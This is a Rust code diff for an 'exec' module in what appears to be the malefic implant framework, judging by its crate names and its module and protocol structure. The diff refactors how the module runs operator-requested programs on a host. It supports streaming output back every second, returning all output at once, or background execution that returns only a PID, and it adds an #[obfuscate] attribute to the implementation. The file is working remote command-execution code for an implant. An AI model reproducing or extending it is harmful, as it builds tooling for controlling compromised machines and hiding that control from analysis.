@@ -1,11 +1,11 @@
-use futures::{AsyncReadExt, FutureExt, SinkExt};
 use futures::channel::mpsc::{self, UnboundedReceiver, UnboundedSender};
+use futures::{AsyncReadExt, FutureExt, SinkExt};
 use futures_timer::Delay;
 use std::time::Duration;
 
-use malefic_helper::common::process::{async_command, run_command};
-use malefic_proto::proto::modulepb::ExecResponse;
 use crate::prelude::*;
+use malefic_process::{async_command, run_command};
+use malefic_proto::proto::modulepb::ExecResponse;
 
 pub struct Exec {}
 
@@ -15,7 +15,7 @@ enum OutputData {
     Stderr(Vec<u8>),
 }
 
-// 异步读取管道数据并发送到 channel
+// Asynchronously read pipe data and send to channel
 async fn read_pipe_async<R: AsyncReadExt + Unpin + Send>(
     mut reader: R,
     sender: UnboundedSender<OutputData>,
@@ -35,33 +35,33 @@ async fn read_pipe_async<R: AsyncReadExt + Unpin + Send>(
                 };
 
                 if sender.unbounded_send(output).is_err() {
-                    break; // Channel 已关闭
+                    break; // Channel closed
                 }
             }
-            Err(_) => break, // 读取错误
+            Err(_) => break, // Read error
         }
     }
 }
-
-
 
 #[async_trait]
 #[module_impl("exec")]
 impl Module for Exec {}
 
 #[async_trait]
-impl malefic_proto::module::ModuleImpl for Exec {
+#[obfuscate]
+impl malefic_module::ModuleImpl for Exec {
     #[allow(unused_variables)]
     async fn run(
         &mut self,
         id: u32,
-        receiver: &mut malefic_proto::module::Input,
-        sender: &mut malefic_proto::module::Output,
-    ) -> malefic_proto::module::ModuleResult {
+        receiver: &mut malefic_module::Input,
+        sender: &mut malefic_module::Output,
+    ) -> malefic_module::ModuleResult {
         let request = check_request!(receiver, Body::ExecRequest)?;
         let mut exec_response = ExecResponse::default();
 
         if request.realtime && request.output {
+            // Mode 1: Realtime streaming — send output chunks every second
             let mut child = async_command(request.path, request.args)?;
             let stdout = child.stdout.take().unwrap();
             let stderr = child.stderr.take().unwrap();
@@ -70,20 +70,24 @@ impl malefic_proto::module::ModuleImpl for Exec {
             let (sender_ch, mut receiver_ch) = mpsc::unbounded::<OutputData>();
             let stdout_task = read_pipe_async(stdout, sender_ch.clone(), true);
             let stderr_task = read_pipe_async(stderr, sender_ch, false);
-            let background_task = async { futures::join!(stdout_task, stderr_task); }.fuse();
+            let background_task = async {
+                futures::join!(stdout_task, stderr_task);
+            }
+            .fuse();
             futures::pin_mut!(background_task);
-            
-            let collect_data = |receiver: &mut UnboundedReceiver<OutputData>| -> (Vec<u8>, Vec<u8>) {
-                let (mut stdout_data, mut stderr_data) = (Vec::new(), Vec::new());
-                while let Ok(Some(data)) = receiver.try_next() {
-                    match data {
-                        OutputData::Stdout(data) => stdout_data.extend_from_slice(&data),
-                        OutputData::Stderr(data) => stderr_data.extend_from_slice(&data),
+
+            let collect_data =
+                |receiver: &mut UnboundedReceiver<OutputData>| -> (Vec<u8>, Vec<u8>) {
+                    let (mut stdout_data, mut stderr_data) = (Vec::new(), Vec::new());
+                    while let Ok(Some(data)) = receiver.try_next() {
+                        match data {
+                            OutputData::Stdout(data) => stdout_data.extend_from_slice(&data),
+                            OutputData::Stderr(data) => stderr_data.extend_from_slice(&data),
+                        }
                     }
-                }
-                (stdout_data, stderr_data)
-            };
-            
+                    (stdout_data, stderr_data)
+                };
+
             loop {
                 futures::select! {
                     _ = Delay::new(Duration::from_secs(1)).fuse() => {
@@ -118,17 +122,18 @@ impl malefic_proto::module::ModuleImpl for Exec {
             }
         } else if request.realtime {
             let child = run_command(request.path, request.args)?;
-            exec_response.pid = child.id();
-            let output = child.wait_with_output()?;
-            exec_response.status_code = output.status.code().unwrap_or(0);
-            if request.output {
-                exec_response.stdout = output.stdout;
-                exec_response.stderr = output.stderr;
-            }
-        } else {
+        } else if request.output {
+            // Mode 2: Wait for process, collect all output at once
             let child = async_command(request.path, request.args)?;
-            let pid = child.id();
-            exec_response.pid = pid;
+            exec_response.pid = child.id();
+            let output = child.output().await?;
+            exec_response.status_code = output.status.code().unwrap_or(0);
+            exec_response.stdout = output.stdout;
+            exec_response.stderr = output.stderr;
+        } else {
+            // Mode 3: Fire-and-forget background execution, return PID only
+            let child = async_command(request.path, request.args)?;
+            exec_response.pid = child.id();
             exec_response.status_code = 0;
         }
 
